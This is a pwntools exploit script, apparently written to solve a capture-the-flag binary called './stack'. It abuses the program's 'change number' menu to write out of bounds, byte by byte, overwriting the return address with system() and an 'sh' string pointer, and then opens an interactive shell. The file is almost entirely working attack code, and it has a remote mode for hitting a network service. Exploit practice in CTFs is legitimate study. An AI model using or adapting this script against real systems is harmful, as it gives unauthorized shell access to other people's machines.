from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
# b* 0x80487fb
b* 0x80488f2
continue
'''.format(**locals())

#Binary filename
exe = './stack'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

def change(index, new):
    p.sendlineafter(b"5. exit\n", "3")
    p.sendlineafter(b"which number to change:", str(index))
    p.sendlineafter(b"new number:", str(new))

p.recvuntil(b"How many numbers you have:\n")
p.sendline("1")
p.recvuntil(b"Give me your numbers\n")
p.sendline(str(1))

write = 132

system_addr = [0x50, 0x84, 0x4, 0x8]
sh_addr = [0x87, 0x89, 0x04, 0x8]

for i in range(4):
    change(write+i, system_addr[i])

for i in range(4):
    change(write+i + 8, sh_addr[i])



p.sendlineafter(b"5. exit\n", "5")



p.interactive()
